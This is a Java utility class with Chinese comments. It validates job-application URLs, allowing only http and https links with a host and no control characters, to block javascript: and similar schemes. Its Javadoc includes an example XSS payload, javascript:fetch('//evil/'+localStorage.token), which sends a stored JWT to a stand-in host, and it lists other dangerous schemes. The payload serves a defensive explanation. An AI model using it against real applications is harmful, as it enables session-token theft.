package com.example.interview.util;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.Locale;

/**
 * 外链协议白名单（P1-04，2026-10-30 质量循环）。
 *
 * <p><b>要解决什么</b>：岗位投递链接 {@code applyUrl} 来自第三方岗位源 JSON、
 * 用户 Excel 导入与 AI 生成三条路径，此前只校验长度（500 字符），没有任何协议限制。
 * 前端把它直接绑到 {@code :href} 与 {@code window.open}。一条
 * {@code javascript:fetch('//evil/'+localStorage.token)} 就能在<b>应用自身源</b>
 * 执行脚本，而本项目 JWT 就存在 localStorage 里 —— 点击「去投递」即可被窃取。
 *
 * <p><b>为什么按「允许清单」而不是「拒绝清单」</b>：拒绝清单永远列不全
 * （{@code javascript:} / {@code data:} / {@code vbscript:} / {@code blob:} /
 * 大小写变体 / 前导空白与控制字符…）。只放行 {@code http} 与 {@code https}
 * 两个协议，其余一律视为不可信，语义上是封闭的。
 *
 * <p><b>为什么先做本地 trim + 控制字符检查，再交给 {@link URI}</b>：
 * {@code new URI("  javascript:alert(1)")} 会抛异常，但 {@code new URI("java\nscript:")}
 * 也可能被某些宽松解析器接受；这里是「只要出现 ASCII 控制字符就拒绝」，
 * 不做任何"净化后重试"——净化后的字符串与用户看到的不是同一个东西，反而更难审计。
 */
public final class UrlSafety {

    /**
     * 与实体列宽一致（{@code apply_url VARCHAR(500)}）。
     * 超长链接一并拒绝：它既写不进库，也不该被前端渲染成可点击元素。
     */
    public static final int MAX_LENGTH = 500;

    private UrlSafety() {
    }

    /** 是否为可安全渲染/跳转的 http(s) 绝对链接 */
    public static boolean isSafeWebUrl(String raw) {
        return sanitize(raw) != null;
    }

    /**
     * 校验并归一化外链。
     *
     * @return 合法时返回 trim 后的原字符串；空白、超长、非 http(s)、无 host、
     *         含控制字符时返回 {@code null}（调用方按「无链接」处理，不要抛异常中断整批）
     */
    public static String sanitize(String raw) {
        if (raw == null) {
            return null;
        }
        String value = raw.trim();
        if (value.isEmpty() || value.length() > MAX_LENGTH) {
            return null;
        }
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (c < 0x20 || c == 0x7f) {
                return null;
            }
        }
        // 先做廉价的前缀判断，避免把明显非法的串交给 URI 解析
        String lower = value.toLowerCase(Locale.ROOT);
        if (!lower.startsWith("http://") && !lower.startsWith("https://")) {
            return null;
        }
        try {
            URI uri = new URI(value);
            String scheme = uri.getScheme();
            if (scheme == null
                    || (!scheme.equalsIgnoreCase("http") && !scheme.equalsIgnoreCase("https"))) {
                return null;
            }
            if (uri.getHost() == null || uri.getHost().isBlank()) {
                return null;
            }
            return value;
        } catch (URISyntaxException e) {
            return null;
        }
    }
}
